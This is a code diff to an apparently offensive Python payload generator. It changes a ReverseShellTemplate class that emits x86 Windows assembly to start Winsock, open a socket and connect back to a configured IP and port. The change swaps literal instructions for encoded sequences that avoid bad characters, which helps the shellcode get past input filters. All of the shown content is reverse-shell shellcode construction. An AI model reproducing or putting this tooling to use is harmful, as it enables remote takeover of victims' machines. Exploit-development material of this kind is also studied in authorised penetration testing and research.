@@ -10,6 +10,7 @@ import socket
 import struct
 
 from .base import PayloadTemplate, TemplateConfig
+from ..encode import encode_dword, encode_word, safe_push_word_as_dword
 
 
 class ReverseShellTemplate(PayloadTemplate):
@@ -44,7 +45,7 @@ class ReverseShellTemplate(PayloadTemplate):
             "    ; WSAStartup(0x0202, &WSADATA)",
             f"    lea  esi, {wsadata}",
             "    push esi                    ; lpWSAData",
-            "    push 0x0202                 ; wVersionRequested = MAKEWORD(2,2)",
+            *safe_push_word_as_dword(0x0202, config.badchars),
             f"    call dword ptr {wsa_start}",
             "",
             "    ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)",
@@ -70,8 +71,11 @@ class ReverseShellTemplate(PayloadTemplate):
             "",
             "    ; Set sockaddr_in address and port",
             f"    lea  edi, {sockaddr}",
-            f"    mov  word ptr [edi+0x02], 0x{port_be:04x}     ; sin_port (big-endian)",
-            f"    mov  dword ptr [edi+0x04], 0x{ip_be:08x}  ; sin_addr (big-endian)",
+            "    xor  eax, eax",
+            *encode_word(port_be, config.badchars, "ax"),
+            "    mov  word ptr [edi+0x02], ax   ; sin_port (big-endian)",
+            *encode_dword(ip_be, config.badchars, "eax"),
+            "    mov  dword ptr [edi+0x04], eax ; sin_addr (big-endian)",
             "",
             "    ; connect(socket, &sockaddr_in, 0x10)",
             f"    lea  eax, {sockaddr}",
